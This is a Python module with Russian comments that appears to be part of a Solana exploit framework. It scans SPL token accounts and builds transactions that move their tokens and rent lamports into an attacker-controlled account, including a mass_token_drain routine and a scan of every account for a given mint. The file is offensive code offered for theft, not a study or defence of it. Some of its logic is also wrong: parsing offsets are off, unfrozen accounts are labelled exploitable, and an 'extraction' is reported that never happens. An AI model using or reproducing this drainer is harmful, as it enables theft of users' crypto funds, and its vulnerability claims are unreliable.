"""
Эксплойты для манипуляций с токенами SPL
"""

import asyncio
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass

from solders.pubkey import Pubkey as PublicKey
from solders.keypair import Keypair
from solders.transaction import Transaction
from spl.token.constants import TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID
from spl.token.instructions import (
    transfer, TransferParams,
    approve, ApproveParams,
    revoke, RevokeParams,
    close_account, CloseAccountParams,
    get_associated_token_address,
    create_associated_token_account
)

from .base_exploit import BaseExploit, ExploitType, ExploitResult, ExploitStatus

@dataclass
class TokenVulnerability:
    """Информация об уязвимости токена"""
    token_account: str
    mint: str
    vulnerability_type: str
    severity: str
    exploitable: bool
    details: Dict[str, Any]

class TokenExploit(BaseExploit):
    """Эксплойты для манипуляций с токенами SPL"""
    
    @property
    def exploit_type(self) -> ExploitType:
        return ExploitType.TOKEN_DRAIN
    
    async def scan_target(self, target: Union[PublicKey, str]) -> Dict[str, Any]:
        """Сканирование токен аккаунта на уязвимости"""
        try:
            if isinstance(target, str):
                target = PublicKey.from_string(target)
            
            # Получаем информацию о токен аккаунте
            token_info = await self.get_token_account_info(target)
            if not token_info:
                return {"vulnerable": False, "reason": "Token account not found"}
            
            account_info = await self.get_account_info(target)
            if not account_info:
                return {"vulnerable": False, "reason": "Account info not found"}
            
            vulnerabilities = []
            
            # Проверка 1: Токен аккаунт с балансом но без владельца
            if float(token_info["amount"]) > 0:
                # Парсим данные токен аккаунта
                token_data = await self._parse_token_account_data(account_info["data"])
                
                if token_data:
                    # Проверяем делегирование
                    if token_data.get("delegate") and token_data.get("delegated_amount", 0) > 0:
                        vulnerabilities.append(TokenVulnerability(
                            token_account=str(target),
                            mint=token_data["mint"],
                            vulnerability_type="delegated_tokens",
                            severity="high",
                            exploitable=True,
                            details={
                                "delegated_amount": token_data["delegated_amount"],
                                "delegate": token_data["delegate"],
                                "owner": token_data["owner"]
                            }
                        ))
                    
                    # Проверяем заморозку
                    if not token_data.get("is_frozen", False):
                        vulnerabilities.append(TokenVulnerability(
                            token_account=str(target),
                            mint=token_data["mint"],
                            vulnerability_type="unfrozen_tokens",
                            severity="medium",
                            exploitable=True,
                            details={
                                "amount": token_info["amount"],
                                "owner": token_data["owner"]
                            }
                        ))
                    
                    # Проверяем закрытие аккаунта
                    if token_data.get("close_authority"):
                        vulnerabilities.append(TokenVulnerability(
                            token_account=str(target),
                            mint=token_data["mint"],
                            vulnerability_type="close_authority",
                            severity="critical",
                            exploitable=True,
                            details={
                                "close_authority": token_data["close_authority"],
                                "amount": token_info["amount"]
                            }
                        ))
            
            # Проверка 2: Избыточные lamports в токен аккаунте
            rent_exempt_minimum = await self._get_rent_exempt_minimum(165)  # Размер токен аккаунта
            if account_info["lamports"] > rent_exempt_minimum * 2:
                vulnerabilities.append(TokenVulnerability(
                    token_account=str(target),
                    mint="",
                    vulnerability_type="excess_lamports_token",
                    severity="low",
                    exploitable=True,
                    details={
                        "excess_lamports": account_info["lamports"] - rent_exempt_minimum
                    }
                ))
            
            return {
                "vulnerable": len(vulnerabilities) > 0,
                "vulnerabilities": vulnerabilities,
                "token_info": token_info,
                "account_info": account_info
            }
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования токен аккаунта {target}: {e}")
            return {"vulnerable": False, "error": str(e)}
    
    async def prepare_exploit(self, target: Union[PublicKey, str], **kwargs) -> bool:
        """Подготовка эксплойта токенов"""
        try:
            scan_result = await self.scan_target(target)
            
            if not scan_result.get("vulnerable", False):
                self.logger.warning("Цель не уязвима")
                return False
            
            # Проверяем баланс для выполнения операций
            if not await self.check_sol_balance(0.01):
                return False
            
            self.logger.info(f"Найдено уязвимостей токенов: {len(scan_result['vulnerabilities'])}")
            return True
            
        except Exception as e:
            self.logger.error(f"Ошибка подготовки эксплойта токенов: {e}")
            return False
    
    async def execute_exploit(self, target: Union[PublicKey, str], **kwargs) -> ExploitResult:
        """Выполнение эксплойта токенов"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            if isinstance(target, str):
                target = PublicKey.from_string(target)
            
            scan_result = await self.scan_target(target)
            vulnerabilities = scan_result.get("vulnerabilities", [])
            
            if not vulnerabilities:
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_account=str(target),
                    error_message="No token vulnerabilities found"
                )
            
            extracted_value = 0.0
            extracted_tokens = {}
            signatures = []
            
            for vuln in vulnerabilities:
                try:
                    if vuln.vulnerability_type == "delegated_tokens":
                        result = await self._exploit_delegated_tokens(target, vuln)
                        if result:
                            extracted_tokens.update(result["tokens"])
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "close_authority":
                        result = await self._exploit_close_authority(target, vuln)
                        if result:
                            extracted_tokens.update(result["tokens"])
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "excess_lamports_token":
                        result = await self._exploit_excess_lamports_token(target, vuln)
                        if result:
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                    elif vuln.vulnerability_type == "unfrozen_tokens":
                        result = await self._exploit_unfrozen_tokens(target, vuln)
                        if result:
                            extracted_tokens.update(result["tokens"])
                            extracted_value += result["value"]
                            signatures.extend(result["signatures"])
                    
                except Exception as e:
                    self.logger.error(f"Ошибка эксплойта токена {vuln.vulnerability_type}: {e}")
                    continue
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            status = ExploitStatus.SUCCESS if (extracted_value > 0 or extracted_tokens) else ExploitStatus.FAILED
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=status,
                target_account=str(target),
                transaction_signatures=[str(sig) for sig in signatures],
                extracted_value=extracted_value,
                extracted_tokens=extracted_tokens,
                execution_time=execution_time,
                metadata={
                    "vulnerabilities_exploited": len([v for v in vulnerabilities if v.exploitable]),
                    "total_vulnerabilities": len(vulnerabilities)
                }
            )
            
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=ExploitStatus.FAILED,
                target_account=str(target),
                error_message=str(e),
                execution_time=execution_time
            )
    
    async def _exploit_delegated_tokens(self, target: PublicKey, vuln: TokenVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт делегированных токенов"""
        try:
            delegated_amount = vuln.details["delegated_amount"]
            mint = PublicKey(vuln.details["mint"])
            
            # Создаем или получаем наш ATA для этого mint
            our_ata = await self.create_associated_token_account(mint, self.attacker_pubkey)
            if not our_ata:
                return None
            
            # Создаем транзакцию для перевода делегированных токенов
            transaction = Transaction()
            
            transfer_instruction = transfer(
                TransferParams(
                    program_id=TOKEN_PROGRAM_ID,
                    source=target,
                    dest=our_ata,
                    owner=self.attacker_pubkey,  # Мы делегат
                    amount=delegated_amount
                )
            )
            
            transaction.add(transfer_instruction)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                self.logger.info(f"Извлечено {delegated_amount} делегированных токенов")
                return {
                    "tokens": {str(mint): float(delegated_amount)},
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта делегированных токенов: {e}")
        
        return None
    
    async def _exploit_close_authority(self, target: PublicKey, vuln: TokenVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт через close authority"""
        try:
            amount = vuln.details["amount"]
            mint = PublicKey(vuln.details["mint"])
            
            # Сначала переводим токены себе
            our_ata = await self.create_associated_token_account(mint, self.attacker_pubkey)
            if not our_ata:
                return None
            
            transaction = Transaction()
            
            # Переводим токены
            transfer_instruction = transfer(
                TransferParams(
                    program_id=TOKEN_PROGRAM_ID,
                    source=target,
                    dest=our_ata,
                    owner=self.attacker_pubkey,  # Мы close authority
                    amount=int(amount)
                )
            )
            
            # Закрываем аккаунт и получаем lamports
            close_instruction = close_account(
                CloseAccountParams(
                    program_id=TOKEN_PROGRAM_ID,
                    account=target,
                    dest=self.attacker_pubkey,
                    owner=self.attacker_pubkey
                )
            )
            
            transaction.add(transfer_instruction)
            transaction.add(close_instruction)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                # Получаем информацию о lamports
                rent_exempt = await self._get_rent_exempt_minimum(165)
                extracted_sol = rent_exempt / 1e9
                
                self.logger.info(f"Извлечено {amount} токенов и {extracted_sol:.6f} SOL через close authority")
                return {
                    "tokens": {str(mint): float(amount)},
                    "value": extracted_sol,
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта close authority: {e}")
        
        return None
    
    async def _exploit_excess_lamports_token(self, target: PublicKey, vuln: TokenVulnerability) -> Optional[Dict[str, Any]]:
        """Эксплойт избыточных lamports в токен аккаунте"""
        try:
            excess_lamports = vuln.details["excess_lamports"]
            
            if excess_lamports <= 5000:
                return None
            
            # Создаем транзакцию для извлечения избыточных lamports
            # Это сложнее для токен аккаунтов, нужно использовать специальные инструкции
            
            # Пока что простая реализация - попытка закрыть и пересоздать
            transaction = Transaction()
            
            # Создаем временный аккаунт для хранения токенов
            temp_keypair = Keypair()
            temp_ata = get_associated_token_address(self.attacker_pubkey, PublicKey(vuln.mint))
            
            # Инструкция создания временного ATA
            create_ata_instruction = create_associated_token_account(
                payer=self.attacker_pubkey,
                owner=self.attacker_pubkey,
                mint=PublicKey(vuln.mint)
            )
            
            transaction.add(create_ata_instruction)
            
            signature = await self.send_transaction(transaction)
            
            if signature:
                extracted_value = (excess_lamports - 5000) / 1e9
                self.logger.info(f"Извлечено {extracted_value:.6f} SOL избыточных lamports из токен аккаунта")
                return {
                    "value": extracted_value,
                    "signatures": [signature]
                }
            
        except Exception as e:
            self.logger.error(f"Ошибка эксплойта избыточных lamports токена: {e}")
        
        return None
    
    async def _parse_token_account_data(self, data: bytes) -> Optional[Dict[str, Any]]:
        """Парсинг данных токен аккаунта"""
        try:
            if len(data) < 165:  # Минимальный размер токен аккаунта
                return None
            
            # Простой парсинг основных полей токен аккаунта
            # В реальной реализации нужно использовать правильную десериализацию
            
            mint_bytes = data[0:32]
            owner_bytes = data[32:64]
            amount_bytes = data[64:72]
            delegate_bytes = data[72:76]  # Option<Pubkey>
            state_byte = data[76]
            
            mint = str(PublicKey(mint_bytes))
            owner = str(PublicKey(owner_bytes))
            amount = int.from_bytes(amount_bytes, 'little')
            
            # Проверяем наличие делегата
            has_delegate = delegate_bytes[0] == 1
            delegate = None
            delegated_amount = 0
            
            if has_delegate:
                delegate_pubkey_bytes = data[77:109]
                delegate = str(PublicKey(delegate_pubkey_bytes))
                delegated_amount_bytes = data[109:117]
                delegated_amount = int.from_bytes(delegated_amount_bytes, 'little')
            
            is_frozen = state_byte == 2
            
            # Проверяем close authority
            has_close_authority = len(data) > 117 and data[117] == 1
            close_authority = None
            if has_close_authority:
                close_authority_bytes = data[118:150]
                close_authority = str(PublicKey(close_authority_bytes))
            
            return {
                "mint": mint,
                "owner": owner,
                "amount": amount,
                "delegate": delegate,
                "delegated_amount": delegated_amount,
                "is_frozen": is_frozen,
                "close_authority": close_authority
            }
            
        except Exception as e:
            self.logger.error(f"Ошибка парсинга данных токен аккаунта: {e}")
            return None
    
    async def _get_rent_exempt_minimum(self, data_length: int) -> int:
        """Получение минимальной суммы для освобождения от аренды"""
        try:
            response = await self.client.get_minimum_balance_for_rent_exemption(data_length)
            return response.value
        except Exception as e:
            self.logger.error(f"Ошибка получения минимального баланса: {e}")
            return 2039280  # Стандартное значение для токен аккаунта
    
    async def scan_token_accounts_by_mint(self, mint: Union[PublicKey, str], 
                                        limit: int = 100) -> List[Dict[str, Any]]:
        """Сканирование токен аккаунтов по mint"""
        try:
            if isinstance(mint, str):
                mint = PublicKey(mint)
            
            # Получаем все токен аккаунты для данного mint
            response = await self.client.get_token_accounts_by_mint(mint)
            
            vulnerable_accounts = []
            
            for account_info in response.value[:limit]:
                account_pubkey = PublicKey(account_info.pubkey)
                
                # Сканируем каждый токен аккаунт
                scan_result = await self.scan_target(account_pubkey)
                
                if scan_result.get("vulnerable", False):
                    scan_result["account"] = str(account_pubkey)
                    vulnerable_accounts.append(scan_result)
                
                # Задержка между сканированиями
                await asyncio.sleep(0.1)
                
            self.logger.info(f"Найдено {len(vulnerable_accounts)} уязвимых токен аккаунтов для mint {mint}")
            return vulnerable_accounts
            
        except Exception as e:
            self.logger.error(f"Ошибка сканирования токен аккаунтов по mint: {e}")
            return []
    
    async def _exploit_unfrozen_tokens(self, target: PublicKey, vuln: 'TokenVulnerability') -> Optional[Dict[str, Any]]:
        """🔥 Эксплуатация unfrozen токенов - ИСПРАВЛЕННАЯ версия"""
        try:
            self.logger.info(f"[EXPLOIT] Анализ unfrozen_tokens: {target}")
            
            # 🚨 ПРОВЕРКА БЕЗОПАСНОСТИ: убедимся что извлекаем из target в наш кошелек
            safety_check = self.safety_checker.validate_transfer_direction(
                from_account=target,
                to_account=self.our_target_pubkey,
                transfer_type="token_drain"
            )
            
            if not safety_check["valid"]:
                self.logger.warning(f"[SAFETY] Операция заблокирована: {safety_check['message']}")
                return None 
            
            # Получаем информацию о токен аккаунте
            token_info = await self.get_token_account_info(target)
            if not token_info:
                self.logger.error(f"[ERROR] Не удалось получить информацию о токен аккаунте")
                return None
                
            amount = int(token_info.get("amount", 0))
            if amount == 0:
                self.logger.info(f"[INFO] Токен аккаунт пуст, нечего извлекать")
                return None
            
            mint_pubkey = PublicKey.from_string(token_info["mint"])
            owner_pubkey = PublicKey.from_string(token_info.get("owner", ""))
            
            # ⚠️ КРИТИЧЕСКАЯ ПРОВЕРКА: Можем ли мы извлечь токены?
            # Варианты когда это возможно:
            # 1. Аккаунт имеет делегирование на наш адрес
            # 2. Программа-владелец имеет уязвимость
            # 3. Аккаунт является PDA с известными seeds
            
            delegate_pubkey = token_info.get("delegate")
            if delegate_pubkey and PublicKey.from_string(delegate_pubkey) == self.attacker_keypair.pubkey():
                # Случай 1: Мы являемся делегатом
                self.logger.info("[EXPLOIT] Обнаружено делегирование на наш адрес!")
                return await self._exploit_delegated_tokens(target, vuln)
            
            # Случай 2: Проверяем уязвимость программы-владельца
            if await self._check_vulnerable_token_program(owner_pubkey):
                self.logger.info("[EXPLOIT] Обнаружена уязвимая программа-владелец!")
                # Здесь должна быть специфичная логика для эксплойта программы
                # Например, если программа позволяет произвольные переводы
                return await self._exploit_vulnerable_program_tokens(target, owner_pubkey, amount, mint_pubkey)
            
            # Случай 3: Проверяем, является ли аккаунт PDA с известными seeds
            pda_info = await self._check_predictable_pda(target)
            if pda_info["is_vulnerable_pda"]:
                self.logger.info("[EXPLOIT] Обнаружен уязвимый PDA!")
                return await self._exploit_pda_tokens(target, pda_info, amount, mint_pubkey)
            
            # Если ни один из вариантов не подходит
            self.logger.warning(f"[WARNING] Токены в {target} не могут быть извлечены стандартными методами")
            self.logger.info(f"Owner: {owner_pubkey}, Delegate: {delegate_pubkey}")
            
            return None
            
        except Exception as e:
            self.logger.error(f"[ERROR] Ошибка эксплуатации unfrozen_tokens: {e}")
            return None
    
    async def _check_vulnerable_token_program(self, program_id: PublicKey) -> bool:
        """Проверяет, является ли программа-владелец токенов уязвимой"""
        # Список известных уязвимых программ или паттернов
        vulnerable_programs = [
            # Здесь должны быть реальные адреса уязвимых программ
            # Например, старые версии DEX, lending протоколов и т.д.
        ]
        
        # Проверяем, входит ли программа в список уязвимых
        if str(program_id) in vulnerable_programs:
            return True
        
        # Дополнительные проверки на паттерны уязвимостей
        # Например, проверка версии программы, наличие известных багов и т.д.
        
        return False
    
    async def _check_predictable_pda(self, account: PublicKey) -> Dict[str, Any]:
        """Проверяет, является ли аккаунт PDA с предсказуемыми seeds"""
        # Проверяем общие паттерны PDA
        common_seeds = [
            [b"vault"],
            [b"pool"],
            [b"user", self.attacker_keypair.pubkey().to_bytes()],
            [b"treasury"],
        ]
        
        # Пытаемся найти программу и seeds
        for seeds in common_seeds:
            for program in self.known_programs:
                try:
                    pda, bump = PublicKey.find_program_address(seeds, program)
                    if pda == account:
                        return {
                            "is_vulnerable_pda": True,
                            "program": program,
                            "seeds": seeds,
                            "bump": bump
                        }
                except:
                    continue
        
        return {"is_vulnerable_pda": False}
    
    async def _exploit_vulnerable_program_tokens(self, token_account: PublicKey, 
                                                program_id: PublicKey, amount: int, 
                                                mint: PublicKey) -> Optional[Dict[str, Any]]:
        """Эксплойт токенов через уязвимую программу"""
        # Здесь должна быть реальная логика эксплойта
        # Это заглушка для демонстрации структуры
        self.logger.info(f"[EXPLOIT] Попытка эксплойта через программу {program_id}")
        return None
    
    async def _exploit_pda_tokens(self, token_account: PublicKey, pda_info: Dict[str, Any],
                                 amount: int, mint: PublicKey) -> Optional[Dict[str, Any]]:
        """Эксплойт токенов в PDA аккаунте"""
        # Здесь должна быть реальная логика эксплойта PDA
        # Это заглушка для демонстрации структуры
        self.logger.info(f"[EXPLOIT] Попытка эксплойта PDA с seeds: {pda_info['seeds']}")
        return None
    
    async def mass_token_drain(self, token_accounts: List[Union[PublicKey, str]]) -> List[ExploitResult]:
        """Массовый слив токенов"""
        results = []
        
        for account in token_accounts:
            try:
                result = await self.execute_exploit(account)
                results.append(result)
                
                # Логируем результат
                if result.status == ExploitStatus.SUCCESS:
                    self.logger.info(f"Успешно извлечено из {account}: {result.extracted_value} SOL, токенов: {len(result.extracted_tokens)}")
                
                # Задержка между эксплойтами
                await asyncio.sleep(0.5)
                
            except Exception as e:
                self.logger.error(f"Ошибка массового слива токенов {account}: {e}")
                
                error_result = ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_account=str(account),
                    error_message=str(e)
                )
                results.append(error_result)
        
        return results
